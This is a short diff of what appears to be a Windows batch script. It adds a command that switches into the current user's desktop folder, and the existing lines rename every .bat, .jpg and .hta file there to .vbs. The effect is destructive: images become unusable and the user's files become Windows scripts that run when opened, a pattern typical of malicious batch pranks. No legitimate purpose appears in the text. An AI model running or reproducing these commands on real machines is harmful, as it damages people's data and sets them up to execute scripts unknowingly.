@@ -1,3 +1,4 @@
+cd C:\Users\%username%\desktop
 ren *.bat *.vbs
 ren *.jpg *.vbs
 ren *.hta *.vbs
